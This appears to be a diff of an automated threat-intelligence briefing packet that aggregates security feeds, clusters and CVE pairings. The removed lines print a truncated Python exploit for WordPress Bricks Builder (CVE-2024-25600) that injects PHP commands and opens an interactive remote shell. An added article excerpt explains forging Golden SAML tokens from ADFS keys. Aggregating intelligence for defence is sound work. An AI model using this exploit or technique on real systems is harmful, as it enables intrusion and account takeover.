@@ -1,13 +1,13 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-07-13T21:03:58.171828+00:00
+- Generated: 2026-07-13T22:04:00.034956+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 77
 - Total items in window: 336
-- Total clusters raw: 151
-- Total clusters in packet: 63
+- Total clusters raw: 150
+- Total clusters in packet: 62
 - Dropped low score: 88
 - Dropped overflow: 0
 
@@ -70,26 +70,21 @@
 
 ## Feed status
 
-- **Unit 42** (threat_research_primary)
-  - URL: https://unit42.paloaltonetworks.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 2
 - **CrowdStrike** (threat_research_primary)
   - URL: https://www.crowdstrike.com/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Unit 42** (threat_research_primary)
+  - URL: https://unit42.paloaltonetworks.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 2
 - **SentinelOne Labs** (threat_research_primary)
   - URL: https://www.sentinelone.com/labs/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **Google Threat Analysis Group** (threat_research_primary)
-  - URL: https://blog.google/threat-analysis-group/rss/
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
 - **Trend Micro Research** (threat_research_primary)
   - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
   - Status: ok
@@ -100,56 +95,66 @@
   - Status: ok
   - Item count: 10
   - In window count: 4
-- **Sekoia** (threat_research_primary)
-  - URL: https://blog.sekoia.io/feed/
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
 - **Cisco Talos** (threat_research_primary)
   - URL: https://feeds.feedburner.com/feedburner/Talos
   - Status: ok
   - Item count: 15
   - In window count: 3
-- **NCSC UK** (government_authoritative)
-  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
-  - Status: ok
-  - Item count: 20
-  - In window count: 3
+- **Sekoia** (threat_research_primary)
+  - URL: https://blog.sekoia.io/feed/
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
+- **Google Threat Analysis Group** (threat_research_primary)
+  - URL: https://blog.google/threat-analysis-group/rss/
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
 - **Citizen Lab** (threat_research_primary)
   - URL: https://citizenlab.ca/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
+- **NCSC UK** (government_authoritative)
+  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
+  - Status: ok
+  - Item count: 20
+  - In window count: 3
 - **Microsoft Threat Intelligence** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 1
-- **SANS Internet Storm Center** (government_authoritative)
-  - URL: https://isc.sans.edu/rssfeed_full.xml
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
-- **Check Point Research** (threat_research_primary)
-  - URL: https://research.checkpoint.com/feed/
-  - Status: ok
-  - Item count: 15
   - In window count: 1
 - **Kaspersky Securelist** (threat_research_primary)
   - URL: https://securelist.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **ESET WeLiveSecurity** (threat_research_primary)
-  - URL: https://www.welivesecurity.com/en/rss/feed/
+- **Check Point Research** (threat_research_primary)
+  - URL: https://research.checkpoint.com/feed/
   - Status: ok
-  - Item count: 100
+  - Item count: 15
   - In window count: 1
+- **SANS Internet Storm Center** (government_authoritative)
+  - URL: https://isc.sans.edu/rssfeed_full.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
 - **Horizon3 Attack Research** (offensive_vulnerability_research)
   - URL: https://horizon3.ai/feed/
   - Status: ok
   - Item count: 10
   - In window count: 6
+- **ESET WeLiveSecurity** (threat_research_primary)
+  - URL: https://www.welivesecurity.com/en/rss/feed/
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
+- **Volexity** (threat_research_primary)
+  - URL: https://www.volexity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **GitHub Security Lab** (offensive_vulnerability_research)
   - URL: https://github.blog/category/security/feed/
   - Status: ok
@@ -160,21 +165,16 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Volexity** (threat_research_primary)
-  - URL: https://www.volexity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
-- **PortSwigger Research** (offensive_vulnerability_research)
-  - URL: https://portswigger.net/research/rss
-  - Status: ok
-  - Item count: 40
-  - In window count: 0
 - **Recorded Future** (threat_research_primary)
   - URL: https://www.recordedfuture.com/feed
   - Status: ok
   - Item count: 50
   - In window count: 3
+- **PortSwigger Research** (offensive_vulnerability_research)
+  - URL: https://portswigger.net/research/rss
+  - Status: ok
+  - Item count: 40
+  - In window count: 0
 - **Assetnote** (offensive_vulnerability_research)
   - URL: https://www.assetnote.io/resources/research/rss.xml
   - Status: ok
@@ -195,16 +195,16 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Proofpoint Threat Insight** (detection_response_operations)
-  - URL: https://www.proofpoint.com/us/rss.xml
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **TrustedSec** (detection_response_operations)
   - URL: https://www.trustedsec.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 2
+- **Proofpoint Threat Insight** (detection_response_operations)
+  - URL: https://www.proofpoint.com/us/rss.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Active Countermeasures** (detection_response_operations)
   - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
@@ -220,26 +220,21 @@
   - Status: ok
   - Item count: 20
   - In window count: 1
-- **SpecterOps** (detection_response_operations)
-  - URL: https://medium.com/feed/specter-ops-posts
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
-- **Datadog Security Labs** (cloud_identity_infrastructure)
-  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
-  - Status: ok
-  - Item count: 30
-  - In window count: 2
-- **Orca Security Research** (cloud_identity_infrastructure)
-  - URL: https://orca.security/resources/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
 - **Rapid7** (offensive_vulnerability_research)
   - URL: https://www.rapid7.com/blog/rss/
   - Status: ok
   - Item count: 20
   - In window count: 2
+- **Datadog Security Labs** (cloud_identity_infrastructure)
+  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
+  - Status: ok
+  - Item count: 30
+  - In window count: 2
+- **SpecterOps** (detection_response_operations)
+  - URL: https://medium.com/feed/specter-ops-posts
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **AWS Security Blog** (cloud_identity_infrastructure)
   - URL: https://aws.amazon.com/blogs/security/feed/
   - Status: ok
@@ -250,6 +245,11 @@
   - Status: ok
   - Item count: 20
   - In window count: 2
+- **Orca Security Research** (cloud_identity_infrastructure)
+  - URL: https://orca.security/resources/blog/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
 - **Permiso Security** (cloud_identity_infrastructure)
   - URL: https://permiso.io/blog/rss.xml
   - Status: ok
@@ -265,11 +265,6 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Sysdig** (detection_response_operations)
-  - URL: https://sysdig.com/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **Google Cloud Threat Intelligence** (threat_research_primary)
   - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
   - Status: ok
@@ -280,6 +275,11 @@
   - Status: ok
   - Item count: 20
   - In window count: 3
+- **Sysdig** (detection_response_operations)
+  - URL: https://sysdig.com/feed/
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **Wiz Research** (cloud_identity_infrastructure)
   - URL: https://www.wiz.io/feed/rss.xml
   - Status: ok
@@ -289,6 +289,11 @@
   - URL: https://deepmind.google/blog/rss.xml
   - Status: ok
   - Item count: 100
+  - In window count: 0
+- **OpenSSF Blog** (ai_security_agentic_risk)
+  - URL: https://openssf.org/feed/
+  - Status: ok
+  - Item count: 10
   - In window count: 0
 - **Coveware** (ransomware_ecrime_financial_crime)
   - URL: https://www.coveware.com/blog?format=rss
@@ -300,36 +305,31 @@
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **Google Cloud Security** (cloud_identity_infrastructure)
-  - URL: https://cloudblog.withgoogle.com/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 20
 - **Chainalysis** (ransomware_ecrime_financial_crime)
   - URL: https://www.chainalysis.com/blog/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 2
-- **OpenSSF Blog** (ai_security_agentic_risk)
-  - URL: https://openssf.org/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
+  - In window count: 1
 - **Interconnects** (ai_security_agentic_risk)
   - URL: https://www.interconnects.ai/feed
   - Status: ok
   - Item count: 20
   - In window count: 1
-- **The Record** (cyber_news_breach_reporting)
-  - URL: https://therecord.media/feed
+- **Google Cloud Security** (cloud_identity_infrastructure)
+  - URL: https://cloudblog.withgoogle.com/rss/
   - Status: ok
-  - Item count: 5
-  - In window count: 5
+  - Item count: 20
+  - In window count: 20
 - **BleepingComputer** (cyber_news_breach_reporting)
   - URL: https://www.bleepingcomputer.com/feed/
   - Status: ok
   - Item count: 15
   - In window count: 15
+- **The Record** (cyber_news_breach_reporting)
+  - URL: https://therecord.media/feed
+  - Status: ok
+  - Item count: 5
+  - In window count: 5
 - **SecurityWeek** (cyber_news_breach_reporting)
   - URL: https://www.securityweek.com/feed/
   - Status: ok
@@ -345,46 +345,46 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **Simon Willison** (ai_security_agentic_risk)
-  - URL: https://simonwillison.net/atom/everything/
-  - Status: ok
-  - Item count: 30
-  - In window count: 20
 - **AI Snake Oil** (ai_security_agentic_risk)
   - URL: https://www.aisnakeoil.com/feed
   - Status: ok
   - Item count: 20
   - In window count: 2
+- **Simon Willison** (ai_security_agentic_risk)
+  - URL: https://simonwillison.net/atom/everything/
+  - Status: ok
+  - Item count: 30
+  - In window count: 21
 - **Dark Reading** (cyber_news_breach_reporting)
   - URL: https://www.darkreading.com/rss.xml
   - Status: ok
   - Item count: 50
-  - In window count: 24
+  - In window count: 23
 - **Help Net Security** (cyber_news_breach_reporting)
   - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **Troy Hunt** (practitioner_analysis)
-  - URL: https://www.troyhunt.com/rss/
+- **Black Hills Information Security** (detection_response_operations)
+  - URL: https://www.blackhillsinfosec.com/feed/
   - Status: ok
-  - Item count: 15
+  - Item count: 100
   - In window count: 1
-- **Krebs on Security** (practitioner_analysis)
-  - URL: https://krebsonsecurity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
-- **Schneier on Security** (practitioner_analysis)
-  - URL: https://www.schneier.com/feed/atom/
-  - Status: ok
-  - Item count: 10
-  - In window count: 6
 - **Team Cymru** (ransomware_ecrime_financial_crime)
   - URL: https://www.team-cymru.com/post/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 0
+- **Troy Hunt** (practitioner_analysis)
+  - URL: https://www.troyhunt.com/rss/
+  - Status: ok
+  - Item count: 15
+  - In window count: 1
+- **Schneier on Security** (practitioner_analysis)
+  - URL: https://www.schneier.com/feed/atom/
+  - Status: ok
+  - Item count: 10
+  - In window count: 6
 - **Reddit r/cybersecurity** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/cybersecurity/.rss
   - Status: ok
@@ -395,18 +395,8 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Black Hills Information Security** (detection_response_operations)
-  - URL: https://www.blackhillsinfosec.com/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **Reddit r/sysadmin** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/sysadmin/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **Reddit r/msp** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/msp/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
@@ -415,51 +405,61 @@
   - Status: ok
   - Item count: 50
   - In window count: 50
-- **Reddit r/netsecstudents** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/netsecstudents/.rss
+- **Intel 471** (ransomware_ecrime_financial_crime)
+  - URL: https://intel471.com/blog/feed
   - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **Reddit r/AskNetsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/AskNetsec/.rss
-  - Status: ok
-  - Item count: 0
+  - Item count: 100
   - In window count: 0
 - **Graham Cluley** (practitioner_analysis)
   - URL: https://grahamcluley.com/feed/
   - Status: ok
   - Item count: 20
   - In window count: 3
+- **Reddit r/msp** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/msp/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
+- **Krebs on Security** (practitioner_analysis)
+  - URL: https://krebsonsecurity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
+- **Reddit r/AskNetsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/AskNetsec/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
 - **Infosecurity Magazine** (cyber_news_breach_reporting)
   - URL: https://www.infosecurity-magazine.com/rss/news/
   - Status: ok
   - Item count: 100
   - In window count: 29
-- **Intel 471** (ransomware_ecrime_financial_crime)
-  - URL: https://intel471.com/blog/feed
+- **Reddit r/netsecstudents** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/netsecstudents/.rss
   - Status: ok
-  - Item count: 100
+  - Item count: 0
   - In window count: 0
 - **Reddit r/netsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsec/.rss
   - Status: ok
   - Item count: 25
   - In window count: 11
-- **Embrace the Red** (ai_security_agentic_risk)
-  - URL: https://embracethered.com/blog/index.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 0
 - **tl;dr sec** (practitioner_analysis)
   - URL: https://tldrsec.com/feed.xml
   - Status: ok
   - Item count: 20
   - In window count: 1
+- **Embrace the Red** (ai_security_agentic_risk)
+  - URL: https://embracethered.com/blog/index.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 0
 - **Risky Business News** (practitioner_analysis)
   - URL: https://risky.biz/feeds/risky-business-news/
   - Status: ok
   - Item count: 100
-  - In window count: 4
+  - In window count: 5
 - **Just Security** (policy_strategy_geopolitics)
   - URL: https://www.justsecurity.org/feed/
   - Status: ok
@@ -472,6 +472,28 @@
   - In window count: 0
 
 ## Affinity groups (themes)
+
+### active exploitation targeting Apple iOS/macOS
+- Anchor signal: Apple iOS/macOS
+- Theme key: apple-ios-macos
+- Cluster count: 4
+- Article count: 7
+- Cohesion: 0.2
+- Shared strong signals: Apple iOS/macOS
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: active_exploitation
+  - affected_products: Apple iOS/macOS
+- Cluster IDs: 598aa947b4, 9d6bdd5305, 605f13c77e, b35394b0f7
+- Links:
+  - https://www.rapid7.com/blog/post/pt-weekly-metasploit-update-exploits-for-flowiseai-csv-agent-and-macos-package-kit
+  - https://www.bleepingcomputer.com/news/security/new-crashstealer-malware-poses-as-apple-crash-reporting-tool/
+  - https://thehackernews.com/2026/07/crashstealer-macos-malware-uses.html
+  - https://www.huntress.com/blog/patch-management-strategy
+  - https://www.securityweek.com/zimbra-patches-critical-code-execution-vulnerability/
+  - https://thehackernews.com/2026/07/compromised-jscrambler-8140-npm-release.html
+  - https://www.bleepingcomputer.com/news/security/hackers-backdoor-jscrambler-npm-package-with-infostealer-malware/
 
 ### Microsoft 365 active exploitation
 - Anchor signal: Microsoft 365
@@ -536,38 +558,17 @@
   - https://www.bleepingcomputer.com/news/security/cisa-warns-of-actively-exploited-rce-flaws-in-joomla-extensions/
   - https://www.securityweek.com/organizations-warned-of-exploited-joomla-extension-vulnerabilities/
 
-### active exploitation targeting Apple iOS/macOS
-- Anchor signal: Apple iOS/macOS
-- Theme key: apple-ios-macos
-- Cluster count: 3
-- Article count: 5
-- Cohesion: 0.2
-- Shared strong signals: Apple iOS/macOS
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: active_exploitation
-  - affected_products: Apple iOS/macOS
-- Cluster IDs: 598aa947b4, 9d6bdd5305, 605f13c77e
-- Links:
-  - https://www.rapid7.com/blog/post/pt-weekly-metasploit-update-exploits-for-flowiseai-csv-agent-and-macos-package-kit
-  - https://www.bleepingcomputer.com/news/security/new-crashstealer-malware-poses-as-apple-crash-reporting-tool/
-  - https://thehackernews.com/2026/07/crashstealer-macos-malware-uses.html
-  - https://www.huntress.com/blog/patch-management-strategy
-  - https://www.securityweek.com/zimbra-patches-critical-code-execution-vulnerability/
-
 ### WordPress vulnerability activity
 - Anchor signal: WordPress
 - Theme key: wordpress
 - Cluster count: 2
 - Article count: 3
-- Cohesion: 0.288
+- Cohesion: 0.273
 - Shared strong signals: WordPress
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
   - affected_products: WordPress
-  - urgency_signals: preauth_unauth
 - Cluster IDs: 1d65faccbc, 08882287bf
 - Links:
   - https://www.exploit-db.com/exploits/52619
@@ -642,22 +643,6 @@
   - https://www.infosecurity-magazine.com/news/uat-7810-china-apt-orb-proxy/
   - https://blog.talosintelligence.com/uat-7810/
 
-### Citrix vulnerability activity
-- Anchor signal: Citrix
-- Theme key: citrix
-- Cluster count: 2
-- Article count: 2
-- Cohesion: 0.2
-- Shared strong signals: Citrix
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - affected_products: Citrix
-- Cluster IDs: aaaf47b0ea, dfea83e3cb
-- Links:
-  - https://www.huntress.com/blog/citrixbleed-2-dragonforce-ransomware
-  - https://www.darkreading.com/vulnerabilities-threats/citrixbleed-ing-again-netscaler-vulnerability-under-attack
-
 ### CVE-2018-0171 exploitation activity
 - Anchor signal: CVE-2018-0171
 - Theme key: cve-2018-0171
@@ -676,7 +661,7 @@
   - https://www.infosecurity-magazine.com/news/russian-state-hackers-vulnerable/
   - https://cyberscoop.com/russian-fsb-cisco-joint-cybersecurity-advisory/
 
-### npm vulnerability activity
+### supply chain targeting npm
 - Anchor signal: npm
 - Theme key: npm
 - Cluster count: 2
@@ -686,12 +671,30 @@
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
+  - threat_categories: supply_chain
+  - affected_industries: financial_services
   - affected_products: npm
 - Cluster IDs: c8e0a6559d, b35394b0f7
 - Links:
   - https://research.checkpoint.com/2026/13th-july-threat-intelligence-report/
   - https://thehackernews.com/2026/07/compromised-jscrambler-8140-npm-release.html
   - https://www.bleepingcomputer.com/news/security/hackers-backdoor-jscrambler-npm-package-with-infostealer-malware/
+
+### Microsoft Defender vulnerability activity
+- Anchor signal: Microsoft Defender
+- Theme key: microsoft-defender
+- Cluster count: 2
+- Article count: 3
+- Cohesion: 0.273
+- Shared strong signals: Microsoft Defender
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - affected_products: Microsoft Defender
+- Cluster IDs: b835d1d4b1, 8fa37afed0
+- Links:
+  - https://www.microsoft.com/en-us/security/blog/2026/07/09/gigawiper-anatomy-of-a-destructive-backdoor-assembled-from-multiple-malware/
+  - https://www.darkreading.com/vulnerabilities-threats/microsoft-rogueplanet-zero-day-threat
 
 ## Forward signals
 
@@ -707,7 +710,6 @@
 ### Convergence (15)
 - Pair: CVE-2024-27822 + Apple iOS/macOS (cluster 598aa947b4, first observation: True)
 - Pair: CVE-2026-41264 + Apple iOS/macOS (cluster 598aa947b4, first observation: True)
-- Pair: CVE-2024-25600 + WordPress (cluster 1d65faccbc, first observation: True)
 - Pair: CVE-2025-12352 + WordPress (cluster 08882287bf, first observation: True)
 - Pair: CVE-2025-6389 + WordPress (cluster 08882287bf, first observation: True)
 - Pair: CVE-2025-7852 + WordPress (cluster 08882287bf, first observation: True)
@@ -720,6 +722,7 @@
 - Pair: CVE-2026-12486 + Cisco (cluster 118be3a32e, first observation: True)
 - Pair: CVE-2026-12488 + Cisco (cluster 118be3a32e, first observation: True)
 - Pair: CVE-2026-25106 + Cisco (cluster 118be3a32e, first observation: True)
+- Pair: CVE-2026-28739 + Cisco (cluster 118be3a32e, first observation: True)
 
 ### Drift (2)
 - **ShinyHunters** (cluster c8e0a6559d)
@@ -911,22 +914,18 @@ CVE-2026-9181 Esri ArcGIS Server Pre-Authentication Path Traversal Vulnerability
 - Source: Exploit-DB (offensive_vulnerability_research)
 - Published: 2026-07-07T00:00:00+00:00
 - Link: https://www.exploit-db.com/exploits/52619
-- Fetch status: ok
+- Fetch status: fetch_failed:HTTPError
 - Member count: 2
 - Corroborating source count: 2
 - Strong signals: WordPress
 
 #### Cluster taxonomy (union across members)
 - affected_products: WordPress
-- cve_ids: CVE-2024-25600
-- urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research, tier_4_news
 
 #### Primary article taxonomy
 - affected_products: WordPress
-- cve_ids: CVE-2024-25600
-- urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
 
@@ -934,12 +933,6 @@ CVE-2026-9181 Esri ArcGIS Server Pre-Authentication Path Traversal Vulnerability
 
 ```
 WordPress Bricks Builder Theme - RCE
-```
-
-#### Full body
-
-```
-Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training WordPress Bricks Builder Theme - RCE EDB-ID: 52619 CVE: 2024-25600 EDB Verified: Author: Jared Brits Type: webapps Exploit: / Platform: Multiple Date: 2026-07-07 Vulnerable App: # Exploit Title: WordPress Bricks Builder Theme - RCE # Date: 2026-06-25 # Exploit Author: Jared Brits (K3ysTr0K3R) # Vendor Homepage: https://bricksbuilder.io/ # Software Link: https://bricksbuilder.io/ # Version: Bricks Builder <= 1.9.6 # Tested On: Kali Linux 2026.1 / WordPress 6.7 # CVE: CVE-2024-25600 # Description: Unauthenticated RCE vulnerability in Bricks Builder theme's # render_element endpoint. Extracts nonce from page source and # executes arbitrary commands on vulnerable WordPress installations. import re import requests import argparse import threading from bs4 import BeautifulSoup from rich.console import Console from prompt_toolkit import PromptSession, HTML from prompt_toolkit.history import InMemoryHistory from prompt_toolkit.auto_suggest import AutoSuggestFromHistory from concurrent.futures import ThreadPoolExecutor, as_completed from alive_progress import alive_bar color = Console() def ascii_art(): color.print("""[yellow] _______ ________ ___ ____ ___ __ __ ___ ___________ ____ ____ / ____/ | / / ____/ |__ \ / __ \__ \/ // / |__ \ / ____/ ___// __ \/ __ \\ / / | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / / / /___ | |/ / /__/_____/ __// /_/ / __/__ __/_____/ __/____/ / /_/ / /_/ / /_/ / \____/ |___/_____/ /____/\____/____/ /_/ /____/_____/\____/\____/\____/ [/yellow]""", style="bold") print("Coded By: Jared Brits (K3ysTr0K3R) --> Hello, Friend!") print("") headers = { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Mobile Safari/537.36" } paths = [ "/wp-json/bricks/v1/render_element", "/?rest_route=/bricks/v1/render_element" ] requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) def fetch_nonce(target): try: response = requests.get(target, verify=False, timeout=10) response.raise_for_status() soup = BeautifulSoup(response.text, "html.parser") script_tag = soup.find("script", id="bricks-scripts-js-extra") if script_tag: match = re.search(r'"nonce":"([a-f0-9]+)"', script_tag.string) if match: nonce = match.group(1) return nonce except Exception: return None def interactive_shell(target, nonce): color.print("[bold bright_green][+][/bold bright_green] Interactive shell opened successfully") session = PromptSession(history=InMemoryHistory()) for vulnerable_path in paths: while True: try: command = session.prompt( HTML("<ansired><b>Shell> </b></ansired>"), auto_suggest=AutoSuggestFromHistory(), ) if command.lower() == "exit": return vulnerable_data = create_vulnerable_data(nonce, command) response = requests.post(target + vulnerable_path, headers=headers, json=vulnerable_data, verify=False, timeout=10) output = response.json().get('data').get('html') cleaned_output = output.replace("Exception: ", "") print(cleaned_output) except KeyboardInterrupt: return def create_vulnerable_data(nonce, command): return { "postId": "1", "nonce": nonce, "element": { "name": "code", "settings": { "executeCode": "true", "code": f"<?php throw new Exception(`{command}`);?>" } } } def exploit(target): nonce = fetch_nonce(target) if nonce: elements = [create_element(nonce) for _ in range(4)] for path, element in zip(paths, elements): if exploit_successful(target, path, element): interactive_shell(target, nonce) break def exploit_successful(target, path, element): color.print("[bold bright_blue][*][/bold bright_blue] Checking if the target is vulnerable") try: response = requests.post(target + path, headers=headers, json=element, verify=False, timeout=10) response.raise_for_status() if response.status_code == 200 and 'KHABuhwxnUHDDW' in response.text: color.print("[bold brig
 ```
 
 #### Corroborating sources (2)
@@ -1199,6 +1192,50 @@ WolfSSL, GeoVision, VTK vulnerabilities By Kri Dontje Thursday, July 9, 2026 14:
   - Link: https://www.infosecurity-magazine.com/news/uat-7810-china-apt-orb-proxy/
   - Summary: Cisco Talos said China-linked APT UAT-7810 is growing its proxy relay network with new malware
 
+### Cluster 2fab803c60 — score 16
+
+- Title: The ‘Ghost’ in the Database: Recovering Active ADFS Signing Keys via Machine DPAPI
+- Source: Google Cloud Threat Intelligence (threat_research_primary)
+- Published: 2026-07-07T14:00:00+00:00
+- Link: https://cloud.google.com/blog/topics/threat-intelligence/recovering-active-adfs-signing-keys-machine-dpapi/
+- Fetch status: ok
+- Member count: 2
+- Corroborating source count: 2
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: news_report
+- confidence_tier: tier_1_primary_research, tier_2_operator
+
+#### Primary article taxonomy
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+Written by: Shebin Mathew Introduction The "Golden SAML" technique, first described by CyberArk researchers in 2017, and further detailed by Mandiant researchers in 2021 , remains one of the most effective methods for threat actors to forge identity assertions in the Microsoft ecosystem. By obtaining the private key of an ADFS token-signing certificate, an attacker can authenticate as any user to any SAML-federated application, bypassing multifactor authentication (MFA), conditional access, and all identity-based controls. However, during a recent red team engagement, Mandiant discovered that when ADFS certificates are manually rotated, configuration drift can silently leave active signing keys exposed in Machine DPAPI. Specifically, Mandiant discovered that in environments where AutoCertificateRollover is disabled and certificates are manually rotated, the database often becomes a 'ghost'—a record that still exists, still decrypts successfully, but references a certificate no longer u
+```
+
+#### Full body
+
+```
+Threat Intelligence The ‘Ghost’ in the Database: Recovering Active ADFS Signing Keys via Machine DPAPI July 7, 2026 Mandiant Mandiant Services Stop attacks, reduce risk, and advance your security. Contact Mandiant Written by: Shebin Mathew Introduction The "Golden SAML" technique, first described by CyberArk researchers in 2017, and further detailed by Mandiant researchers in 2021 , remains one of the most effective methods for threat actors to forge identity assertions in the Microsoft ecosystem. By obtaining the private key of an ADFS token-signing certificate, an attacker can authenticate as any user to any SAML-federated application, bypassing multifactor authentication (MFA), conditional access, and all identity-based controls. However, during a recent red team engagement, Mandiant discovered that when ADFS certificates are manually rotated, configuration drift can silently leave active signing keys exposed in Machine DPAPI. Specifically, Mandiant discovered that in environments where AutoCertificateRollover is disabled and certificates are manually rotated, the database often becomes a 'ghost'—a record that still exists, still decrypts successfully, but references a certificate no longer used for token signing by the ADFS service. This attack vector warrants attention because the underlying configuration is commonly deployed in enterprise environments. The technique avoids direct interaction with components such as LSASS and the live ADFS service process, which are often subject to enhanced monitoring in enterprise environments, and may therefore result in lower visibility depending on the organization’s telemetry coverage. This post details how adversaries may exploit this TTP to forge high-privilege SAML tokens and provides the blueprint to defend against it. Technical Insight: Encountering the ‘Ghost Certificate’ Analysts followed the standard DKM extraction path, retrieving the encrypted blob from the WID database and decrypting it using the DKM material stored in Active Directory. The extraction succeeded, but the recovered certificate was no longer valid for token signing, and Entra ID rejected the resulting tokens with AADSTS500172 due to invalid signing material. Although structurally correct, the artifact is not usable for authentication, as the active signing key resides in the system’s machine-scoped cryptographic store, protected by Windows Machine DPAPI and managed through the operating system’s cryptographic subsystem. Successfully obtaining this active key allows an attacker to forge valid SAML assertions for any user, bypassing the need for user credentials and multi-factor authentication, and granting unauthorized access to any SAML-federated application including Microsoft 365 and Entra ID within the organization's environment. Analysis revealed that AutoCertificateRollover had been disabled and a manual rotation had been performed. Confirmation was obtained directly via Get-AdfsProperties , which returned AutoCertificateRollover: False , indicating that certificate lifecycle management had been delegated to manual administrative processes. While the ADFS service used a new valid key for signing, the WID configuration database was never updated to reflect the new certificate—leaving an expired "ghost" entry as the only record. This drift condition surfaces via Microsoft Event ID 385, which indicates certificate validity warnings in the ADFS service. Notably, this event self-resolves when AutoCertificateRollover is re-enabled and a subsequent certificate rollover is performed; in environments where it is disabled and manual rotation is performed without a corresponding database update, it is the observable symptom of this drift condition. Figure 1: ADFS certificate enumeration output showing configuration drift between the WID database and the active host certificate ADFS maintains private keys in two protection contexts. In Location 1 (User DPAPI) , encrypted key blobs may exist on disk, but the DPAPI p
+```
+
+#### Corroborating sources (2)
+
+- **Google Cloud Threat Intelligence** (threat_research_primary)
+  - Title: The ‘Ghost’ in the Database: Recovering Active ADFS Signing Keys via Machine DPAPI
+  - Published: 2026-07-07T14:00:00+00:00
+  - Link: https://cloud.google.com/blog/topics/threat-intelligence/recovering-active-adfs-signing-keys-machine-dpapi/
